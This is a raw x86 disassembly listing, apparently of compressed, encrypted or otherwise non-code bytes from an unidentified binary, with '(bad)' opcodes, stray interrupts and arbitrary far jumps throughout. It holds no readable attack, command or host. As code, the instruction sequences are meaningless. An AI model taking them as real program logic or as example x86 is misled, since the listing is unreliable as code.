  419ea0:	cmp    cl,BYTE PTR [edx-0x3179ebbe]
  419ea6:	shr    BYTE PTR [esi-0x1b45708a],cl
  419eac:	repz sbb dh,BYTE PTR [edi-0x5e]
  419eb0:	ss scas eax,DWORD PTR es:[edi]
  419eb2:	fdiv   QWORD PTR [esi-0xa]
  419eb5:	adc    al,0x3d
  419eb7:	aas    
  419eb8:	data16 fwait
  419eba:	mov    ebx,DWORD PTR [ebp+0x46]
  419ebd:	dec    ebx
  419ebe:	scas   al,BYTE PTR es:[edi]
  419ebf:	push   ds
  419ec0:	mov    ah,0x48
  419ec2:	stos   DWORD PTR es:[edi],eax
  419ec3:	push   0xe5d76547
  419ec8:	scas   eax,DWORD PTR es:[edi]
  419ec9:	xchg   esi,eax
  419eca:	cmp    al,BYTE PTR [ebx+0x331cd6c8]
  419ed0:	fidivr DWORD PTR [ebx]
  419ed2:	push   eax
  419ed3:	das    
  419ed4:	das    
  419ed5:	mov    esp,0x4b7fe9bd
  419edb:	pop    ebp
  419edc:	lahf   
  419edd:	sar    DWORD PTR [ebx+0xe7c76a6],0x50
  419ee4:	sbb    DWORD PTR [edx],edi
  419ee6:	(bad)  
  419ee7:	ficom  WORD PTR [eax-0x39c2d770]
  419eed:	pop    ds
	...
  419f56:	xchg   eax,ebx
  419f58:	pop    ss
  419f59:	lds    ebx,FWORD PTR [edi-0x31]
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	sti    
  419f63:	call   0x17a97494
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	pop    DWORD PTR [edi+0x5]
  419f71:	in     eax,0x10
  419f73:	xor    esi,DWORD PTR [edi+0x2bba39a6]
  419f79:	and    al,0xda
  419f7b:	mov    al,ds:0xfda3fa6d
  419f80:	pop    ds
  419f81:	int    0x96
  419f83:	lods   eax,DWORD PTR ds:[esi]
  419f84:	jg     0x419f27
  419f86:	jecxz  0x419ff1
  419f88:	sbb    cl,dl
  419f8a:	adc    edi,edi
  419f8c:	ins    BYTE PTR es:[edi],dx
  419f8d:	xlat   BYTE PTR ds:[ebx]
  419f8e:	sbb    dl,BYTE PTR cs:[esi-0x4e]
  419f92:	in     eax,0x6a
  419f94:	(bad)  
  419f95:	into   
  419f96:	je     0x419fe5
  419f98:	iret   
  419f99:	(bad)  
  419f9a:	fwait
  419f9b:	ret    0x73d1
  419f9e:	pop    ebx
  419f9f:	mov    dl,0x23
  419fa1:	out    dx,eax
  419fa2:	or     esp,esp
  419fa4:	mov    ebx,0x6a15bae9
  419fa9:	icebp  
  419faa:	call   0xd982f2ab
  419faf:	xchg   ecx,eax
  419fb0:	jmp    0x7811:0x1fcc0f26
  419fb7:	sbb    BYTE PTR [ecx],dh
  419fb9:	adc    al,0x27
  419fbb:	sbb    bl,bl
  419fbd:	inc    esi
  419fbe:	or     DWORD PTR [ecx+edi*1-0x486119ac],edx
  419fc5:	xchg   ebp,eax
  419fc6:	repz dec esi
  419fc8:	cmp    DWORD PTR [esi],edx
  419fca:	sub    eax,0xbd1c82ec
  419fcf:	adc    edx,DWORD PTR [ecx+ebp*8+0x7ac579c4]
  419fd6:	scas   eax,DWORD PTR es:[edi]
  419fd7:	std    
  419fd8:	mov    ebx,0x91fe4d75
  419fdd:	dec    ecx
  419fde:	ret    0x734
  419fe1:	mov    cl,0xa
  419fe3:	or     bl,BYTE PTR [ebp-0x5fabcea8]
  419fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fea:	icebp  
  419feb:	and    BYTE PTR [eax+0x4c831483],ah
  419ff1:	idiv   esp
  419ff3:	stos   DWORD PTR es:[edi],eax
  419ff4:	mov    eax,0xba2a5139
  419ff9:	cmp    bh,dl
  419ffb:	pop    ds
  419ffc:	add    edx,DWORD PTR ds:0x2994d0d8
  41a002:	cmp    cl,cl
  41a004:	in     eax,0x95
  41a006:	dec    ecx
  41a007:	mov    dl,0x8c
  41a009:	in     al,0x6
  41a00b:	fimul  WORD PTR [eax]
  41a00d:	sbb    edi,DWORD PTR gs:[eax+0x12]
  41a011:	pop    esi
  41a012:	push   ebx
  41a013:	jge    0x419fd1
  41a015:	cli    
  41a016:	pop    ds
  41a017:	inc    edx
  41a018:	ffree  st(3)
  41a01a:	sbb    bl,BYTE PTR [edx+0x624f96ca]
  41a020:	leave  
  41a021:	sub    esp,DWORD PTR [ecx+ebx*8]
  41a024:	ficomp DWORD PTR [edx+0x599f7b74]
  41a02a:	xlat   BYTE PTR ds:[ebx]
  41a02b:	or     cl,BYTE PTR [ebp+ebp*4+0x2f]
  41a02f:	aaa    
  41a030:	jae    0x41a083
  41a032:	mov    al,ds:0x51b7a5eb
  41a037:	addr16 push cs
  41a039:	repnz pop ds
  41a03b:	les    esi,FWORD PTR ds:0xd8f7ede9
  41a041:	xchg   ebp,eax
  41a042:	ins    BYTE PTR es:[edi],dx
  41a043:	inc    esp
  41a044:	repz cmp bh,cl
  41a047:	inc    edx
  41a048:	imul   BYTE PTR [eax+edx*4]
  41a04b:	nop
  41a04c:	cdq    
  41a04d:	jmp    0x41a06d
  41a04f:	push   0xd522c8b
  41a054:	jb     0x41a07a
  41a056:	push   ebp
  41a057:	adc    eax,0x6d0f8a2c
  41a05c:	or     eax,0x46cdf8f9
  41a061:	mov    cs,WORD PTR [ebp+ebx*4-0x483b539f]
  41a068:	loopne 0x41a00f
  41a06a:	ja     0x41a096
  41a06c:	pop    ebx
  41a06d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41a0d6:	dec    esi
  41a0d7:	jmp    0x41a103
  41a0d9:	dec    esi
  41a0da:	scas   eax,DWORD PTR es:[edi]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax+0x1e],bh
  41a0e3:	cld    
  41a0e4:	dec    ebx
  41a0e5:	arpl   WORD PTR [edi+0x18],sp
  41a0e8:	add    DWORD PTR [eax],eax
  41a0ea:	add    BYTE PTR [ecx],al
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	std    
  41a0ef:	test   BYTE PTR [edx+0x55563755],ch
  41a0f5:	in     eax,dx
  41a0f6:	jg     0x41a112
  41a0f8:	dec    ebp
  41a0f9:	sub    al,0xb8
  41a0fb:	pop    edx
  41a0fc:	mov    ds:0x770ed97c,eax
  41a101:	iret   
  41a102:	pop    ebx
  41a103:	ror    BYTE PTR [esi],0x31
  41a106:	loopne 0x41a182
  41a108:	popf   
  41a109:	or     dh,0xb
  41a10c:	inc    edx
  41a10d:	mov    al,ds:0xd76a4ba6
  41a112:	lahf   
  41a113:	cwde   
  41a114:	hlt    
  41a115:	pop    esp
  41a116:	and    DWORD PTR [ecx],esi
  41a118:	out    dx,eax
  41a119:	or     DWORD PTR [edx],esp
  41a11b:	cmp    BYTE PTR [edi-0x1a30895e],al
  41a121:	xchg   edi,edx
  41a123:	or     DWORD PTR [edi+0x63],edx
  41a126:	push   edi
  41a127:	mov    eax,0x6cb3bbc1
  41a12c:	mov    ds:0xdea33859,al
  41a131:	dec    esp
  41a132:	and    al,0xa6
  41a134:	(bad)  
  41a135:	in     al,dx
  41a136:	push   cs
  41a137:	js     0x41a131
  41a139:	push   ss
  41a13a:	setns  BYTE PTR [edx]
  41a13d:	out    dx,eax
  41a13e:	(bad)  
  41a140:	mov    ah,BYTE PTR [ebx]
  41a142:	and    DWORD PTR [esi-0x6],ebp
  41a145:	bound  ebp,QWORD PTR [edx+0x7f]
  41a148:	nop
  41a149:	test   eax,0xa5ed5d99
  41a14e:	add    eax,0x7d43248e
  41a153:	xchg   ebx,eax
  41a154:	mov    eax,0x4ba9b7d8
  41a159:	jns    0x41a1d7
  41a15b:	fidiv  DWORD PTR [ebp+0x36f9f112]
  41a161:	pop    ebp
  41a162:	popa   
  41a163:	hlt    
  41a164:	xchg   ebp,eax
  41a165:	cmp    edx,ebx
  41a167:	shl    BYTE PTR [edi],0xd3
  41a16a:	test   DWORD PTR [ebx+0x6d00fcba],edx
  41a170:	inc    ebx
  41a171:	fwait
  41a172:	pop    edx
  41a173:	mov    DWORD PTR [ecx-0x13],ecx
  41a176:	pop    ebp
  41a177:	or     ch,al
  41a179:	sbb    edi,DWORD PTR [edi+0x31]
  41a17c:	push   0x51
  41a17e:	imul   esi,DWORD PTR [eax-0x69],0xc48dcd1b
  41a185:	cmp    al,0x2e
  41a187:	xchg   ebp,eax
  41a188:	loopne 0x41a170
  41a18a:	mov    edi,DWORD PTR gs:[ebp-0x51cdeb60]
  41a191:	sub    edi,DWORD PTR [eax]
  41a193:	push   ebx
  41a194:	mov    esp,ds
  41a196:	mov    eax,0x92ef55c6
  41a19b:	inc    esp
  41a19c:	cmp    BYTE PTR [eax],bh
  41a19e:	inc    ebx
  41a19f:	or     DWORD PTR [eax+0x77],esi
  41a1a2:	stos   BYTE PTR es:[edi],al
  41a1a3:	push   ss
  41a1a4:	jmp    0x96616342
  41a1a9:	ret    
  41a1aa:	xchg   ebp,eax
  41a1ab:	cli    
  41a1ac:	into   
  41a1ad:	fmul   DWORD PTR [eax]
  41a1af:	pop    es
  41a1b0:	popa   
  41a1b1:	xchg   esp,edx
  41a1b3:	add    BYTE PTR ds:0xfa898778,bh
  41a1b9:	gs int 0x2a
  41a1bc:	mov    ebx,0x3817c640
  41a1c1:	inc    edi
  41a1c2:	les    esp,FWORD PTR [ebx+0x1b]
  41a1c5:	neg    DWORD PTR [ecx+0x74c5cd01]
  41a1cb:	lahf   
  41a1cc:	inc    ebx
  41a1cd:	mov    ebp,0xbd9f38e2
  41a1d2:	xor    eax,0x6f584603
  41a1d7:	adc    DWORD PTR [ebp-0x3],0xba997102
  41a1de:	stos   BYTE PTR es:[edi],al
  41a1df:	add    eax,0x7f6fffa3
  41a1e4:	ss mov eax,0x3adc6b60
  41a1ea:	mov    bl,0xa7
  41a1ec:	dec    eax
  41a1ed:	retf   
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	call   0x67c32c75
  41a267:	sbb    DWORD PTR [ecx],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    ch,dh
  41a26f:	test   al,0xdf
  41a271:	sahf   
  41a272:	inc    edi
  41a273:	xchg   BYTE PTR [eax-0x15],dl
  41a276:	ins    BYTE PTR es:[edi],dx
  41a277:	xor    ebx,DWORD PTR [ecx+ebp*2+0x273f2f93]
  41a27e:	cmp    BYTE PTR [ecx-0x13],0x2c
  41a282:	add    esi,esi
  41a284:	int    0xa2
  41a286:	add    bh,dl
  41a288:	and    cl,BYTE PTR [edi]
  41a28a:	inc    edi
  41a28b:	js     0x41a2ee
  41a28d:	repnz mov edi,0xa3a2cc
  41a293:	es cmp al,0xf1
  41a296:	lds    ebp,FWORD PTR [ecx]
  41a298:	push   0xeeba63bf
  41a29d:	int    0xc0
  41a29f:	fs add edi,eax
  41a2a2:	sub    esp,DWORD PTR [edx]
  41a2a4:	mov    ch,0x68
  41a2a6:	jns    0x41a2a1
  41a2a8:	das    
  41a2a9:	call   0x6f74:0xb409931e
  41a2b0:	jae    0x41a285
  41a2b2:	gs scas al,BYTE PTR es:[edi]
  41a2b4:	and    eax,DWORD PTR ds:0x53ca36a1
  41a2ba:	(bad)  
  41a2bb:	xor    edi,DWORD PTR [edi+0x5f9b0b9]
  41a2c1:	fwait
  41a2c2:	jecxz  0x41a29a
  41a2c4:	mov    esp,0xe5ff59e
  41a2c9:	test   ebp,edi
  41a2cb:	adc    BYTE PTR [ebx],cl
  41a2cd:	(bad)  
  41a2cf:	retf   0xe6d5
  41a2d2:	push   ss
  41a2d3:	mov    ah,0x46
  41a2d5:	les    esi,FWORD PTR [esi+ebx*2]
  41a2d8:	mov    eax,0x19369a86
  41a2dd:	cmp    cl,BYTE PTR [edi]
  41a2df:	fbstp  TBYTE PTR cs:[ecx-0x4f1c1e6b]
  41a2e6:	into   
  41a2e7:	and    esp,ecx
  41a2e9:	adc    eax,0xc9652285
  41a2ee:	dec    ebx
  41a2ef:	dec    eax
  41a2f0:	add    al,0xd1
  41a2f2:	in     al,0xf7
  41a2f4:	ja     0x41a2f2
  41a2f6:	add    DWORD PTR [esi-0x18],ebp
  41a2f9:	call   0x8acd2146
  41a2fe:	mov    dl,0xc
  41a300:	inc    ebx
  41a301:	or     cl,BYTE PTR [ecx+0x2d16775e]
  41a307:	retf   
  41a308:	xor    al,0xca
  41a30a:	push   edi
  41a30b:	pop    ebx
  41a30c:	repz leave 
  41a30e:	stc    
  41a30f:	xchg   BYTE PTR [edx-0x224f5ed1],cl
  41a315:	je     0x41a38e
  41a317:	or     DWORD PTR [esi],esi
  41a319:	or     edi,DWORD PTR [esi-0x1cd8a6c3]
  41a31f:	mov    esp,0x498ead3e
  41a324:	add    esi,esi
  41a326:	mov    ebp,0x664b44cf
  41a32b:	call   0x620e:0x2225d56d
  41a332:	mov    gs,WORD PTR [esi]
  41a334:	mov    dl,0x36
  41a336:	mov    ds:0x7207a700,al
  41a33b:	(bad)  
  41a33c:	fldcw  WORD PTR [esi+edi*1-0x25d6cd9d]
  41a343:	xor    eax,0x83954180
  41a348:	out    dx,eax
  41a349:	sub    DWORD PTR [esi-0x48],ecx
  41a34c:	loop   0x41a341
  41a34e:	add    bl,BYTE PTR [edi*2+0x41c7e653]
  41a355:	addr16 jmp 0xd33e2493
  41a35b:	(bad)  
  41a35d:	push   esi
  41a35e:	in     eax,0xda
  41a360:	sbb    esi,eax
  41a362:	pop    edx
  41a363:	inc    esi
  41a364:	jae    0x41a3c8
  41a366:	fidiv  WORD PTR [eax]
  41a368:	sbb    esp,DWORD PTR [esi-0x3f]
  41a36b:	out    dx,al
  41a36c:	test   al,0xbb
	...
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	fadd   DWORD PTR [ecx]
  41a3e4:	pop    eax
  41a3e5:	clc    
  41a3e6:	sbb    al,BYTE PTR [bx+di]
  41a3e9:	add    BYTE PTR [eax],al
  41a3eb:	add    DWORD PTR [eax],eax
  41a3ed:	add    BYTE PTR [ebx+0x4a],bh
  41a3f0:	enter  0x27d8,0xcc
  41a3f4:	aaa    
  41a3f5:	xor    BYTE PTR [ebx+edi*8+0xaf6e015],ch
  41a3fc:	and    dl,al
  41a3fe:	enter  0xedad,0x4a
  41a402:	aam    0x61
  41a404:	bswap  eax
  41a406:	mov    eax,0x4275b8a4
  41a40b:	mov    ebx,0x86e862db
  41a410:	push   esi
  41a411:	and    BYTE PTR [edx-0x4b],bl
  41a414:	cdq    
  41a415:	inc    ebp
  41a416:	mov    ebx,0xfa1b725
  41a41b:	or     eax,0x7e6a3b
  41a420:	(bad)  
  41a421:	push   eax
  41a422:	enter  0xa441,0xb3
  41a426:	iret   
  41a427:	jnp    0x41a44f
  41a429:	jo     0x41a3c3
  41a42b:	test   eax,0x2e0b8e23
  41a430:	arpl   WORD PTR [ebx-0xf11488b],bx
  41a436:	adc    edx,DWORD PTR [ebp-0x5f]
  41a439:	xchg   edi,eax
  41a43a:	cmp    esi,DWORD PTR [edi+eax*8+0x5f]
  41a43e:	mov    bl,0xe8
  41a440:	fwait
  41a441:	rol    DWORD PTR [edi],cl
  41a443:	imul   ebp,DWORD PTR [eax+0x78057096],0x18
  41a44a:	push   cs
  41a44b:	sub    DWORD PTR [ebp+0x5f9fa2ae],edx
  41a451:	dec    ebx
  41a452:	jmp    0xe15a:0x8146cf21
  41a459:	int3   
  41a45a:	shr    DWORD PTR [ebx+0x5f6b4ccc],cl
  41a460:	mov    ch,0xd2
  41a462:	ja     0x41a4c6
  41a464:	push   esi
  41a465:	cmp    ch,BYTE PTR [eax-0x4d13e817]
  41a46b:	gs dec edi
  41a46d:	xchg   edi,eax
  41a46e:	imul   esp,DWORD PTR [ebp+0x50f97df4],0xeb4c11de
  41a478:	ret    0x938
  41a47b:	add    ch,BYTE PTR [edi-0x27cf2452]
  41a481:	mov    ah,0x54
  41a483:	sub    eax,0xc9fb94b3
  41a488:	xor    ecx,edi
  41a48a:	mov    dl,0xeb
  41a48c:	jns    0x41a45a
  41a48e:	sbb    WORD PTR [esi-0xa],dx
  41a492:	cld    
  41a493:	fcmovnb st,st(0)
  41a495:	xchg   DWORD PTR [ebx-0x11],edi
  41a498:	push   edx
  41a499:	cmp    ah,BYTE PTR [eax-0x435aa12f]
  41a49f:	mov    bh,BYTE PTR [eax+0x6b6eb10f]
  41a4a5:	inc    edi
  41a4a6:	sub    BYTE PTR [edx-0x451b8f62],bh
  41a4ac:	scas   al,BYTE PTR es:[edi]
  41a4ad:	and    bl,BYTE PTR [ecx+0x64]
  41a4b0:	ja     0x41a4ba
  41a4b2:	xor    ecx,edi
  41a4b4:	dec    ecx
  41a4b5:	sahf   
  41a4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4b7:	xlat   BYTE PTR ds:[ebx]
  41a4b8:	sti    
  41a4b9:	pop    edx
  41a4ba:	int    0x3a
  41a4bc:	pusha  
  41a4bd:	inc    ecx
  41a4be:	pushf  
  41a4bf:	pop    ds
  41a4c0:	in     al,dx
  41a4c1:	les    esi,FWORD PTR [edx]
  41a4c3:	sbb    dl,dh
  41a4c5:	fdiv   st(6),st
  41a4c7:	and    ecx,0xffffff8f
  41a4ca:	cmp    BYTE PTR ds:0x7957fe03,ah
  41a4d0:	push   edx
  41a4d1:	sub    eax,0x7d4b0c31
  41a4d6:	adc    edi,DWORD PTR [ebx+ebx*1-0x17]
  41a4da:	add    eax,0xbfe740b4
  41a4df:	retf   
  41a4e0:	cmc    
  41a4e1:	repnz pop ds
  41a4e3:	sub    BYTE PTR gs:[ecx-0x64],0x7e
  41a4e8:	xor    ebp,edi
  41a4ea:	popa   
  41a4eb:	sub    eax,0x33d6
	...
  41a554:	add    BYTE PTR [eax],al
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	je     0x41a5c5
  41a564:	mov    ds:0x11b679d,eax
  41a569:	add    BYTE PTR [eax],al
  41a56b:	add    DWORD PTR [eax],eax
  41a56d:	add    BYTE PTR ds:0x3cd5f541,ah
  41a573:	mov    WORD PTR [ebx],cs
  41a575:	ds add al,0xf7
  41a578:	jle    0x41a5d3
  41a57a:	push   ebx
  41a57b:	test   al,0xbc
  41a57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a57e:	xor    BYTE PTR [ebx],ch
  41a580:	add    al,0x56
  41a582:	inc    eax
  41a583:	cmp    bh,BYTE PTR [esi+ebx*1]
  41a586:	lea    eax,[edi-0x3c]
  41a589:	add    eax,0xe63b51b4
  41a58e:	mov    bp,WORD PTR [esi]
  41a591:	std    
  41a592:	xchg   ebp,eax
  41a593:	mov    dl,0x9a
  41a595:	stos   DWORD PTR es:[edi],eax
  41a596:	ins    BYTE PTR es:[edi],dx
  41a597:	and    BYTE PTR [ebx],0xff
  41a59a:	mov    dl,0x1
  41a59c:	shl    DWORD PTR [ebp-0xbc51824],1
  41a5a2:	jge    0x41a550
  41a5a4:	pop    edx
  41a5a5:	add    BYTE PTR [ecx+0xcb04a56],cl
  41a5ab:	imul   edi,DWORD PTR [edx-0x57435ba0],0xfbb20b39
  41a5b5:	mov    al,ds:0x97ca198e
  41a5ba:	push   ebp
  41a5bb:	fld    QWORD PTR ds:0x94b2cdce
  41a5c1:	into   
  41a5c2:	stc    
  41a5c3:	mov    esp,0xc0c68ca0
  41a5c8:	test   ecx,eax
  41a5ca:	repnz not dh
  41a5cd:	(bad)  
  41a5ce:	shl    esi,1
  41a5d0:	ficom  DWORD PTR [esi+0x284ccbd1]
  41a5d6:	pop    ebp
  41a5d7:	or     ecx,DWORD PTR [ebp*2+0x3ba7c9a5]
  41a5de:	push   ss
  41a5df:	out    0x37,al
  41a5e1:	lds    ebp,FWORD PTR [ebx+0x3c7d972c]
  41a5e7:	push   esp
  41a5e8:	enter  0x3c75,0xe6
  41a5ec:	test   al,0x1b
  41a5ee:	push   edx
  41a5ef:	test   al,0xc
  41a5f1:	xchg   esi,eax
  41a5f2:	or     al,0x76
  41a5f4:	outs   dx,BYTE PTR ds:[esi]
  41a5f5:	clc    
  41a5f6:	push   ds
  41a5f7:	pop    esp
  41a5f8:	adc    eax,DWORD PTR [ebx]
  41a5fa:	adc    cl,bl
  41a5fc:	(bad)  
  41a5fd:	mov    edx,DWORD PTR [ebx]
  41a5ff:	xchg   ebx,eax
  41a600:	push   esi
  41a601:	out    0x9c,eax
  41a603:	dec    ebx
  41a604:	ret    
  41a605:	mov    ebp,ebx
  41a607:	aas    
  41a608:	sbb    dl,BYTE PTR [ebp-0x2d045d59]
  41a60e:	mov    ebx,0x325134e9
  41a613:	addr16 js 0x41a5bf
  41a616:	call   0x9c0d:0x9ea002e4
  41a61d:	xor    eax,DWORD PTR [edi]
  41a61f:	xchg   ebp,eax
  41a620:	imul   edi,DWORD PTR [ebx+eiz*1],0x1531c040
  41a627:	adc    dh,BYTE PTR [ecx]
  41a629:	dec    ebx
  41a62a:	(bad)  
  41a62b:	cli    
  41a62c:	clc    
  41a62d:	add    ah,BYTE PTR [edi+0x20d86c79]
  41a633:	inc    ebx
  41a634:	xor    BYTE PTR [esp-0x6967e250],al
  41a63b:	fadd   st,st(2)
  41a63d:	pop    ecx
  41a63e:	inc    ebx
  41a63f:	loopne 0x41a5fd
  41a641:	dec    edi
  41a642:	repz pop esi
  41a644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a645:	lock and BYTE PTR [edi-0x61],bh
  41a649:	call   0x79aaa292
  41a64e:	sbb    edi,DWORD PTR [edi]
  41a650:	xchg   esp,eax
  41a651:	pop    esi
  41a652:	not    DWORD PTR [ebx-0x547161cc]
  41a658:	je     0x41a63e
  41a65a:	jne    0x41a636
  41a65c:	cmp    DWORD PTR [edx],ebx
  41a65e:	xchg   ebx,eax
  41a65f:	outs   dx,BYTE PTR ds:[esi]
  41a660:	mov    eax,ds:0x38a6a8ab
  41a665:	enter  0xa869,0x7c
  41a669:	test   BYTE PTR [edx+eiz*1],0x2f
  41a66d:	mov    bh,0x0
	...
  41a6d3:	add    BYTE PTR [eax],al
  41a6d5:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0x1c08a625
  41a6e4:	sbb    eax,0x11c677f
  41a6e9:	add    BYTE PTR [eax],al
  41a6eb:	add    DWORD PTR [eax],eax
  41a6ed:	add    BYTE PTR [ebx],bh
  41a6ef:	xchg   bh,dh
  41a6f1:	or     ch,BYTE PTR [ecx+0x37890d64]
  41a6f7:	cs sub esp,edx
  41a6fa:	mov    ebp,DWORD PTR [ecx+0x50]
  41a6fd:	lods   eax,DWORD PTR ds:[esi]
  41a6fe:	mov    bl,0xb6
  41a700:	(bad)  
  41a701:	in     al,0x64
  41a703:	pop    esi
  41a704:	pop    ebp
  41a705:	push   ebp
  41a706:	cmc    
  41a707:	jmp    0x41a6c1
  41a709:	mov    ds:0x6efa999a,al
  41a70e:	rep stos BYTE PTR es:[edi],al
  41a710:	(bad)  
  41a711:	sub    BYTE PTR [eax+esi*4-0x45],bh
  41a715:	xchg   ch,ah
  41a717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a718:	inc    esp
  41a719:	add    eax,0x13e68282
  41a71e:	lock popa 
  41a720:	and    al,0x5c
  41a722:	nop
  41a723:	pop    ebp
  41a724:	leave  
  41a725:	ss push cs
  41a727:	mov    eax,0x9d5b0a2a
  41a72c:	dec    eax
  41a72d:	xchg   ebp,eax
  41a72e:	jmp    0xdc069ed3
  41a733:	fwait
  41a734:	add    BYTE PTR [eax],bl
  41a736:	(bad)  
  41a738:	adc    edi,DWORD PTR [esi+ebp*4]
  41a73b:	ins    DWORD PTR es:[edi],dx
  41a73c:	and    esi,DWORD PTR [edx+edi*4]
  41a73f:	add    eax,0xf3c09aa
  41a744:	imul   ecx,DWORD PTR [esi+0x1],0xae001c85
  41a74b:	js     0x41a6d8
  41a74d:	mov    bh,0x79
  41a74f:	addr16 mov esi,0x217cb0c5
  41a755:	cmp    BYTE PTR [esi],cl
  41a757:	xchg   ecx,eax
  41a758:	xchg   ebx,eax
  41a759:	mov    bl,0xbf
  41a75b:	mov    dh,BYTE PTR cs:[eax]
  41a75e:	outs   dx,BYTE PTR ds:[esi]
  41a75f:	js     0x41a71a
  41a761:	sti    
  41a762:	test   esi,0xb58f28dd
  41a768:	sti    
  41a769:	into   
  41a76a:	ror    DWORD PTR [ecx+edi*2-0x376b7ea4],1
  41a771:	test   BYTE PTR [ebp+edx*1-0x7ecfc344],al
  41a778:	test   BYTE PTR [edx-0x1d],0x49
  41a77c:	pop    ebx
  41a77d:	or     edx,edx
  41a77f:	loop   0x41a7cf
  41a781:	das    
  41a782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a783:	jp     0x41a76d
  41a785:	(bad)  
  41a786:	lods   al,BYTE PTR ds:[esi]
  41a787:	jg     0x41a7d9
  41a789:	loopne 0x41a7c1
  41a78b:	sub    DWORD PTR [ecx+0x47478259],esi
  41a791:	or     eax,0x81456837
  41a796:	hlt    
  41a797:	or     al,0x33
  41a799:	jmp    0x14c6251a
  41a79e:	xchg   edi,eax
  41a79f:	push   edx
  41a7a0:	aaa    
  41a7a1:	pop    edi
  41a7a2:	inc    ebp
  41a7a3:	push   es
  41a7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a5:	inc    esi
  41a7a6:	fadd   QWORD PTR [eax-0x595d5198]
  41a7ac:	div    DWORD PTR [eax]
  41a7ae:	or     bh,BYTE PTR [esi-0x6526c8ef]
  41a7b4:	jp     0x41a835
  41a7b6:	mov    edi,0x9b36d7f4
  41a7bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7bc:	mov    bl,0xf9
  41a7be:	xor    ch,BYTE PTR ds:0xad42244a
  41a7c4:	stos   BYTE PTR es:[edi],al
  41a7c5:	adc    BYTE PTR [ebp-0x7c],bl
  41a7c8:	adc    ah,dl
  41a7ca:	push   ds
  41a7cb:	test   al,0x49
  41a7cd:	pop    edi
  41a7ce:	add    al,0x54
  41a7d0:	inc    ebp
  41a7d1:	call   0x8a6a:0x2d439e32
  41a7d8:	sub    al,0x27
  41a7da:	pop    ds
  41a7db:	and    DWORD PTR [edx],ebx
  41a7dd:	scas   al,BYTE PTR es:[edi]
  41a7de:	cmp    esp,DWORD PTR [ebx-0x5e825f57]
  41a7e4:	add    dl,BYTE PTR [edx]
  41a7e6:	adc    esi,0xffffff8b
  41a7e9:	cmp    eax,0x5d98cd0d
	...
  41a856:	repz xchg edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0x8e5327ca,al
  41a863:	cld    
  41a864:	(bad)  [ebp+0x67]
  41a867:	sbb    eax,0x1000001
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	mov    eax,0xc621f928
  41a873:	push   0xead13fa2
  41a878:	jmp    0x7c42:0x48c2d8b0
  41a87f:	pop    ebx
  41a880:	into   
  41a881:	dec    esi
  41a882:	cmp    edx,DWORD PTR [ecx-0x24630d20]
  41a888:	pop    edx
  41a889:	in     eax,dx
  41a88a:	mov    edi,0x75ef5f59
  41a88f:	(bad)  
  41a890:	xor    edi,edx
  41a892:	sub    cl,bh
  41a894:	ins    BYTE PTR es:[edi],dx
  41a895:	add    al,0x89
  41a897:	in     eax,dx
  41a898:	sub    ebp,edi
  41a89a:	lock jmp 0x159d:0xf642e620
  41a8a2:	shl    BYTE PTR [ebx-0x69],1
  41a8a5:	fwait
  41a8a6:	mov    esi,0xeb99d837
  41a8ab:	sar    DWORD PTR [ebx],cl
  41a8ad:	das    
  41a8ae:	lds    eax,FWORD PTR [esi+0x2a]
  41a8b1:	inc    ebp
  41a8b2:	mov    ebp,0xfbc1a81b
  41a8b7:	pop    esp
  41a8b8:	hlt    
  41a8b9:	push   ebp
  41a8ba:	inc    eax
  41a8bb:	mov    esi,0xff29d4a
  41a8c0:	jb     0x41a86f
  41a8c2:	xchg   ebp,eax
  41a8c3:	adc    al,0xa1
  41a8c5:	das    
  41a8c6:	bound  edi,QWORD PTR [edi-0x33842abb]
  41a8cc:	out    dx,al
  41a8cd:	retf   0xad58
  41a8d0:	mov    al,ds:0xe6fc99f
  41a8d5:	and    eax,0xfa95181b
  41a8da:	inc    edi
  41a8db:	(bad)  
  41a8dc:	cmp    eax,edx
  41a8de:	jmp    FWORD PTR ds:0xcd607192
  41a8e4:	pushf  
  41a8e5:	push   ebp
  41a8e6:	xor    DWORD PTR [edi*4+0x263de4c4],0xffffffd4
  41a8ee:	dec    eax
  41a8ef:	sbb    eax,0x75d61203
  41a8f4:	sar    DWORD PTR [ecx],1
  41a8f6:	sti    
  41a8f7:	outs   dx,BYTE PTR ds:[esi]
  41a8f8:	ss in  eax,0x20
  41a8fb:	out    dx,eax
  41a8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
